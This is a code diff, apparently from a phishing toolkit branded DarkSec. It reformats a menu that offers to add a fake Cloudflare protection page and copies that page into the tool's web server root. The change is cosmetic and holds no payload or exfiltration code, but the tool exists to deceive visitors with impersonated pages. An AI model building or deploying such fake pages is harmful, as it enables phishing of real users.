@@ -18,29 +18,21 @@ default_palette = theme.default_palette
 def add_cloudflare_prompt():
 
     run_command("clear")
-    print(
-        """{1}
+    print("""{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
-        {0}** BY: {1}DARKSEC {0}**""".format(
-            default_palette[0], default_palette[2]
-        )
-    )
+        {0}** BY: {1}DARKSEC {0}**""".format(default_palette[0],
+                                             default_palette[2]))
     print(
-        "-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------".format(
-            default_palette[0], default_palette[4]
-        )
-    )
+        "-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------"
+        .format(default_palette[0], default_palette[4]))
     print(
-        "\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)".format(
-            default_palette[0], default_palette[4]
-        )
-    )
-    choice = input(
-        "\n\n{0}YOUR CHOICE >>> {1}".format(default_palette[0], default_palette[2])
-    ).upper()
+        "\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)"
+        .format(default_palette[0], default_palette[4]))
+    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(
+        default_palette[0], default_palette[2])).upper()
     if choice == "Y":
         add_cloudfare()
     else:
@@ -60,9 +52,6 @@ def add_cloudfare():
         print("Unable to find index file, skipping...")
         return
     copyfile("WebPages/cloudflare.html", "Server/www/index.html")
-    print(
-        "\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(
-            default_palette[0], default_palette[4]
-        )
-    )
+    print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(
+        default_palette[0], default_palette[4]))
     wait(1)
